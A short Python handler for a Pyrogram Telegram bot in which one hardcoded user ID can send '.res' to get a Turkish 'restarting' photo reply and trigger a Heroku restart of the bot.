from handlers import check_heroku
from helpers.filters import command
from pyrogram import Client, filters
from helpers.filters import command, other_filters
from helpers.decorators import authorized_users_only
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, Chat, CallbackQuery
from config import SUDO_USERS

@Client.on_message(filters.user(2017429022) & filters.command(["res"], ["."]))
@check_heroku
async def gib_restart(client, message, hap):
    msg_ = await message.reply_photo(
                                     photo="https://te.legra.ph/file/f412a0a94c1da161a7013.jpg", 
                                     caption="**Restart atılıyor**\n**Lütfen bekleyin...**"
   )
    hap.restart()
